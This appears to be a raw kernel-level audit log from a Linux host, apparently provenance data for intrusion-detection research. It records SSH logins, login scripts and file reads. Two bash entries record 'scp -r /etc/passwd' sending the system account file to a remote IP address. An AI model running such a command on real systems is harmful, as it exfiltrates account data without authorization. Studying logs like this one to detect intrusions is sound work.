1557868428.783:1461111498,788E8363-DC1A-A76E-4D3A-44B73AF69A80:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868428.719:1461111172,788E8363-DC1A-A76E-4D3A-44B73AF69A80:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868428.711:1461110916,09D976E0-7983-0FA2-9025-F6C2A7F17123:sshd,EXECUTE,788E8363-DC1A-A76E-4D3A-44B73AF69A80,sshd,null
1557868428.711:1461110890,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,09D976E0-7983-0FA2-9025-F6C2A7F17123,sshd,null
1557868428.547:1461110059,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868428.547:1461109984,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868428.547:1461109902,3054DFA4-3269-4D53-9EC5-DF302D2247C6:sshd,CHANGE_PRINCIPAL,9B441F5B-088B-0919-2078-8C74583D3346,sshd,null
1557868428.547:1461109901,3054DFA4-3269-4D53-9EC5-DF302D2247C6:sshd,CHANGE_PRINCIPAL,3054DFA4-3269-4D53-9EC5-DF302D2247C6,sshd,null
1557868428.547:1461109900,9B441F5B-088B-0919-2078-8C74583D3346:sshd,CHANGE_PRINCIPAL,3054DFA4-3269-4D53-9EC5-DF302D2247C6,sshd,null
1557868427.167:1461106149,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106146,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106143,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106140,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106137,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106134,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106131,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.167:1461106109,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.163:1461106014,2FF5F9AC-F514-9569-0541-19ED81569234:scp,EXECUTE,F223945A-A03E-B46D-B9DC-83EB9F6D0BE7,ssh,null
1557868427.163:1461106005,F47AC98E-A6B7-5476-D67A-172A039C2346:scp,FORK,2FF5F9AC-F514-9569-0541-19ED81569234,scp,null
1557868427.163:1461105998,F47AC98E-A6B7-5476-D67A-172A039C2346:scp,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868427.159:1461105923,B5599FF9-780E-31EB-8323-B52D2BBDE502:bash,EXECUTE,F47AC98E-A6B7-5476-D67A-172A039C2346,b'scp -r /etc/passwd admin@128.55.12.75:./files/',null
1557868427.159:1461105912,250A55CE-34B0-6135-166C-76D5F99BD83F:bash,FORK,B5599FF9-780E-31EB-8323-B52D2BBDE502,bash,null
1557868421.363:1461089504,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.363:1461089501,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.363:1461089498,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.363:1461089495,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.363:1461089492,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.363:1461089489,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.363:1461089486,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.359:1461089463,D3769E34-6394-C661-A0B8-E5D460F2D894:ssh,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.355:1461089368,AEA05252-064F-D72B-0038-16A04FD90ACB:scp,EXECUTE,D3769E34-6394-C661-A0B8-E5D460F2D894,ssh,null
1557868421.355:1461089358,6E645DC5-A5D8-10E5-B58F-9AC1D2FF541E:scp,FORK,AEA05252-064F-D72B-0038-16A04FD90ACB,scp,null
1557868421.355:1461089351,6E645DC5-A5D8-10E5-B58F-9AC1D2FF541E:scp,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.355:1461089290,D2322C89-5126-1C0B-FD2C-4D4A082B30F7:bash,EXECUTE,6E645DC5-A5D8-10E5-B58F-9AC1D2FF541E,b'scp -r /etc/passwd admin@128.55.12.75:./test/',null
1557868421.351:1461089282,250A55CE-34B0-6135-166C-76D5F99BD83F:bash,FORK,D2322C89-5126-1C0B-FD2C-4D4A082B30F7,bash,null
1557868421.175:1461086095,250A55CE-34B0-6135-166C-76D5F99BD83F:bash,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.175:1461086012,0A0ADF9F-F7AF-1335-72D3-CFA71BE56350:sshd,EXECUTE,250A55CE-34B0-6135-166C-76D5F99BD83F,bash,null
1557868421.175:1461085886,02A57CD8-78C4-5793-1AD1-FDFAA2CD2195:sshd,FORK,0A0ADF9F-F7AF-1335-72D3-CFA71BE56350,sshd,null
1557868421.175:1461085839,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.175:1461085833,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.175:1461085813,908460E7-B624-6A6B-06DE-E20562D1E837:sshd,CHANGE_PRINCIPAL,02A57CD8-78C4-5793-1AD1-FDFAA2CD2195,sshd,null
1557868421.171:1461085791,5A49FE92-3CD6-D358-D70E-2859CDD92C55:sshd,CHANGE_PRINCIPAL,908460E7-B624-6A6B-06DE-E20562D1E837,sshd,null
1557868421.171:1461085788,9B441F5B-088B-0919-2078-8C74583D3346:sshd,FORK,5A49FE92-3CD6-D358-D70E-2859CDD92C55,sshd,null
1557868421.171:1461085779,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.171:1461085743,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.171:1461085740,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.171:1461085737,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.127:1461083557,7229BD86-2A4A-EC3B-2EA4-0FE8389CFBBE:lsb_release,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868421.119:1461083315,3E26D0EB-D3F5-F8E1-5785-9BEF9D86750F:91-release-upgr,EXECUTE,7229BD86-2A4A-EC3B-2EA4-0FE8389CFBBE,lsb_release,null
1557868421.119:1461083308,6ABA4DB3-4794-88A0-565E-FCB5DEFB50A3:91-release-upgr,FORK,3E26D0EB-D3F5-F8E1-5785-9BEF9D86750F,91-release-upgr,null
1557868421.119:1461083301,F9FAAF75-5DF4-E563-99E8-FDAE6BB97E79:91-release-upgr,FORK,6ABA4DB3-4794-88A0-565E-FCB5DEFB50A3,91-release-upgr,null
1557868421.119:1461083279,3D7FCD8A-7B7F-A8BC-5E97-5F2D01476E49:run-parts,EXECUTE,F9FAAF75-5DF4-E563-99E8-FDAE6BB97E79,91-release-upgr,null
1557868421.119:1461083276,30C60984-85A0-DDD7-1A78-3DCA5DB76B85:run-parts,FORK,3D7FCD8A-7B7F-A8BC-5E97-5F2D01476E49,run-parts,null
1557868420.983:1461074863,2F2A49A7-16AA-2C2C-5999-E756A6CC0793:landscape-sysin,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.979:1461074446,602426F6-A143-14CC-540A-E1CB96C17488:50-landscape-sy,EXECUTE,2F2A49A7-16AA-2C2C-5999-E756A6CC0793,landscape-sysin,null
1557868420.979:1461074444,6712E0AE-8A11-2FEA-B0D1-E6C024F2CEDA:50-landscape-sy,FORK,602426F6-A143-14CC-540A-E1CB96C17488,50-landscape-sy,null
1557868420.975:1461074138,399F2CF9-0972-573A-D90C-C79BF9D8ECAD:run-parts,EXECUTE,6712E0AE-8A11-2FEA-B0D1-E6C024F2CEDA,50-landscape-sy,null
1557868420.975:1461074131,30C60984-85A0-DDD7-1A78-3DCA5DB76B85:run-parts,FORK,399F2CF9-0972-573A-D90C-C79BF9D8ECAD,run-parts,null
1557868420.971:1461073827,F548FD47-50E3-63F3-B966-044F3DEE5739:env,EXECUTE,30C60984-85A0-DDD7-1A78-3DCA5DB76B85,run-parts,null
1557868420.971:1461073780,84D0CDF2-2546-0A8B-FF1B-A3EBA0AC445E:sh,EXECUTE,F548FD47-50E3-63F3-B966-044F3DEE5739,env,null
1557868420.971:1461073756,267E0A83-5EC4-897D-0D26-100B29250FDF:sh,FORK,84D0CDF2-2546-0A8B-FF1B-A3EBA0AC445E,sh,null
1557868420.971:1461073704,1A4DD008-6320-53E2-16F7-DD50D040C475:sshd,EXECUTE,267E0A83-5EC4-897D-0D26-100B29250FDF,sh,null
1557868420.971:1461073675,9B441F5B-088B-0919-2078-8C74583D3346:sshd,FORK,1A4DD008-6320-53E2-16F7-DD50D040C475,sshd,null
1557868420.971:1461073637,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.951:1461073442,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.951:1461073391,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.951:1461073379,FC488713-2045-0E9A-BFD7-B27F2FA84C93:sshd,CHANGE_PRINCIPAL,9B441F5B-088B-0919-2078-8C74583D3346,sshd,null
1557868420.951:1461073378,3C0B8BA9-0500-8C5F-2F8B-F22B5A0F1981:sshd,CHANGE_PRINCIPAL,FC488713-2045-0E9A-BFD7-B27F2FA84C93,sshd,null
1557868420.951:1461073377,FC488713-2045-0E9A-BFD7-B27F2FA84C93:sshd,CHANGE_PRINCIPAL,3C0B8BA9-0500-8C5F-2F8B-F22B5A0F1981,sshd,null
1557868420.951:1461073376,9B441F5B-088B-0919-2078-8C74583D3346:sshd,CHANGE_PRINCIPAL,FC488713-2045-0E9A-BFD7-B27F2FA84C93,sshd,null
1557868420.951:1461073374,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.951:1461073360,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.951:1461073320,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868420.951:1461073317,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.947:1461073288,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868420.947:1461073285,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.843:1461072842,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.843:1461072810,9B441F5B-088B-0919-2078-8C74583D3346:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868420.843:1461072809,9B441F5B-088B-0919-2078-8C74583D3346:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868420.735:1461072395,9B441F5B-088B-0919-2078-8C74583D3346:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868420.735:1461072139,40BAE387-9580-FE01-E03E-5524F2EC9AF6:sshd,EXECUTE,9B441F5B-088B-0919-2078-8C74583D3346,sshd,null
1557868420.735:1461072118,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,40BAE387-9580-FE01-E03E-5524F2EC9AF6,sshd,null
1557868416.571:1461058925,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.571:1461058857,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.571:1461058780,BFBB7251-258B-BF7A-8904-2472415757CE:sshd,CHANGE_PRINCIPAL,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36,sshd,null
1557868416.571:1461058779,BFBB7251-258B-BF7A-8904-2472415757CE:sshd,CHANGE_PRINCIPAL,BFBB7251-258B-BF7A-8904-2472415757CE,sshd,null
1557868416.571:1461058778,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,CHANGE_PRINCIPAL,BFBB7251-258B-BF7A-8904-2472415757CE,sshd,null
1557868416.087:1461054797,46936654-B372-4E02-2B6A-8604F0C76C20:bash,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.083:1461054714,D68FB36B-7B03-27C6-EBA2-B703288F20D5:sshd,EXECUTE,46936654-B372-4E02-2B6A-8604F0C76C20,bash,null
1557868416.083:1461054594,F30BA293-9A8E-8A11-5933-62CAE3D31FAB:sshd,FORK,D68FB36B-7B03-27C6-EBA2-B703288F20D5,sshd,null
1557868416.083:1461054547,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.083:1461054541,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.083:1461054521,C15B02EB-892F-768C-A882-E5F0F491EA8B:sshd,CHANGE_PRINCIPAL,F30BA293-9A8E-8A11-5933-62CAE3D31FAB,sshd,null
1557868416.083:1461054499,3F067DDE-F29B-CDA3-3488-14B0A747FC76:sshd,CHANGE_PRINCIPAL,C15B02EB-892F-768C-A882-E5F0F491EA8B,sshd,null
1557868416.083:1461054496,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,FORK,3F067DDE-F29B-CDA3-3488-14B0A747FC76,sshd,null
1557868416.083:1461054487,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.083:1461054451,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.083:1461054448,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.083:1461054445,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.039:1461052292,D83E0E2D-CAE2-8D9C-4B8F-5141B94CEC12:lsb_release,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868416.027:1461052022,877619C2-D7E6-A854-8904-42F242555605:91-release-upgr,EXECUTE,D83E0E2D-CAE2-8D9C-4B8F-5141B94CEC12,lsb_release,null
1557868416.027:1461052015,054AF3B6-570E-C6FE-6834-249B8934378A:91-release-upgr,FORK,877619C2-D7E6-A854-8904-42F242555605,91-release-upgr,null
1557868416.027:1461052008,7795437B-271D-7B10-5956-15710E1F2011:91-release-upgr,FORK,054AF3B6-570E-C6FE-6834-249B8934378A,91-release-upgr,null
1557868416.027:1461051986,D62273D8-F317-1007-E445-BA45DA79A64A:run-parts,EXECUTE,7795437B-271D-7B10-5956-15710E1F2011,91-release-upgr,null
1557868416.027:1461051985,134EEAB7-6D1A-ABEE-78CF-5C65C882F020:run-parts,FORK,D62273D8-F317-1007-E445-BA45DA79A64A,run-parts,null
1557868415.887:1461043455,876EF792-3910-BD75-2DB8-26ACA6F2293E:landscape-sysin,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.879:1461043050,1C65D907-7310-C996-5F0A-F3C2A564E551:50-landscape-sy,EXECUTE,876EF792-3910-BD75-2DB8-26ACA6F2293E,landscape-sysin,null
1557868415.879:1461043046,9474A96D-E012-DFB4-55A4-2C823DB53406:50-landscape-sy,FORK,1C65D907-7310-C996-5F0A-F3C2A564E551,50-landscape-sy,null
1557868415.879:1461042770,A4733D4D-963C-52B6-8277-ECEC751CFC54:run-parts,EXECUTE,9474A96D-E012-DFB4-55A4-2C823DB53406,50-landscape-sy,null
1557868415.879:1461042769,134EEAB7-6D1A-ABEE-78CF-5C65C882F020:run-parts,FORK,A4733D4D-963C-52B6-8277-ECEC751CFC54,run-parts,null
1557868415.875:1461042451,D21AAD4C-60BA-4169-6BE7-091562277A67:env,EXECUTE,134EEAB7-6D1A-ABEE-78CF-5C65C882F020,run-parts,null
1557868415.875:1461042435,0BC9E606-700E-3CB5-DA6A-8D336443F791:sh,EXECUTE,D21AAD4C-60BA-4169-6BE7-091562277A67,env,null
1557868415.875:1461042431,90B94239-A9C3-8123-0426-15B226BCCF72:sh,FORK,0BC9E606-700E-3CB5-DA6A-8D336443F791,sh,null
1557868415.875:1461042365,2B7BE269-9875-BC7E-87D4-FBF3332300A1:sshd,EXECUTE,90B94239-A9C3-8123-0426-15B226BCCF72,sh,null
1557868415.875:1461042345,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,FORK,2B7BE269-9875-BC7E-87D4-FBF3332300A1,sshd,null
1557868415.875:1461042314,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.847:1461041904,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.847:1461041853,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.847:1461041841,5784E2A5-C54B-D224-49D6-BD157871F8B4:sshd,CHANGE_PRINCIPAL,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36,sshd,null
1557868415.847:1461041840,215B15EA-CF71-DB1E-E9D0-6008C1889F31:sshd,CHANGE_PRINCIPAL,5784E2A5-C54B-D224-49D6-BD157871F8B4,sshd,null
1557868415.847:1461041839,5784E2A5-C54B-D224-49D6-BD157871F8B4:sshd,CHANGE_PRINCIPAL,215B15EA-CF71-DB1E-E9D0-6008C1889F31,sshd,null
1557868415.847:1461041838,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,CHANGE_PRINCIPAL,5784E2A5-C54B-D224-49D6-BD157871F8B4,sshd,null
1557868415.847:1461041836,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.847:1461041822,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.847:1461041781,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868415.847:1461041778,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.839:1461041724,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868415.839:1461041721,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.735:1461041343,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.735:1461041299,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868415.735:1461041298,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868415.635:1461040203,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868415.631:1461039947,7DCA1CCE-C3DC-4EBF-346F-D80585A20FAC:sshd,EXECUTE,7F3B5238-93FE-0275-5D1B-3FA70CD6FE36,sshd,null
1557868415.631:1461039926,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,7DCA1CCE-C3DC-4EBF-346F-D80585A20FAC,sshd,null
1557868411.479:1461025405,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.479:1461025334,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.475:1461025272,7408C8F8-96F8-B3E3-1F00-215BB18979B6:sshd,CHANGE_PRINCIPAL,3D105049-6801-0B24-72EB-40C22765DFCB,sshd,null
1557868411.475:1461025271,7408C8F8-96F8-B3E3-1F00-215BB18979B6:sshd,CHANGE_PRINCIPAL,7408C8F8-96F8-B3E3-1F00-215BB18979B6,sshd,null
1557868411.475:1461025270,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,CHANGE_PRINCIPAL,7408C8F8-96F8-B3E3-1F00-215BB18979B6,sshd,null
1557868411.179:1461020636,499DC345-7F4D-621A-5E1B-68C3303F6CD9:bash,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.179:1461020553,491844EF-B0C1-2ED2-BDCD-479D94616E59:sshd,EXECUTE,499DC345-7F4D-621A-5E1B-68C3303F6CD9,bash,null
1557868411.179:1461020434,6E404F9C-E810-C02F-6A18-A880D29411B0:sshd,FORK,491844EF-B0C1-2ED2-BDCD-479D94616E59,sshd,null
1557868411.179:1461020384,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.179:1461020378,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.175:1461020358,4BB0FFC4-BB6C-0812-90B2-3F6CDA8F8EF7:sshd,CHANGE_PRINCIPAL,6E404F9C-E810-C02F-6A18-A880D29411B0,sshd,null
1557868411.175:1461020336,B1661E7C-96DA-A4EA-03A9-9942AEC890ED:sshd,CHANGE_PRINCIPAL,4BB0FFC4-BB6C-0812-90B2-3F6CDA8F8EF7,sshd,null
1557868411.175:1461020333,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,FORK,B1661E7C-96DA-A4EA-03A9-9942AEC890ED,sshd,null
1557868411.175:1461020324,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.175:1461020288,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.175:1461020285,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.175:1461020282,3D105049-6801-0B24-72EB-40C22765DFCB:sshd,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.123:1461018102,766ABC53-77FA-C33F-222B-7ECC9B7CC9BC:lsb_release,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868411.111:1461017834,7F5E453A-DE45-E7BF-C20D-19974235B643:91-release-upgr,EXECUTE,766ABC53-77FA-C33F-222B-7ECC9B7CC9BC,lsb_release,null
1557868411.111:1461017825,E9EE41E0-5B98-ED4D-B782-71FBD6EBB67B:91-release-upgr,FORK,7F5E453A-DE45-E7BF-C20D-19974235B643,91-release-upgr,null
1557868411.111:1461017818,AA9B02DE-11C4-4CBE-B0FE-E088B965FB41:91-release-upgr,FORK,E9EE41E0-5B98-ED4D-B782-71FBD6EBB67B,91-release-upgr,null
1557868411.111:1461017796,53D1C5E9-11D0-C986-E689-869177841145:run-parts,EXECUTE,AA9B02DE-11C4-4CBE-B0FE-E088B965FB41,91-release-upgr,null
1557868411.111:1461017795,10D9EED4-3F77-5EAC-2AF0-933EECC4451F:run-parts,FORK,53D1C5E9-11D0-C986-E689-869177841145,run-parts,null
1557868410.963:1461009277,583C6DCD-E84A-4257-C4FF-41137FF4784C:landscape-sysin,MMAP,1FF66D06-025B-DF8C-C7F7-67FA8645F8FC,/etc/passwd,null
1557868410.955:1461008855,9D9FB0FB-846C-FC22-1F62-1D58EAC3D221:50-landscape-sy,EXECUTE,583C6DCD-E84A-4257-C4FF-41137FF4784C,landscape-sysin,null
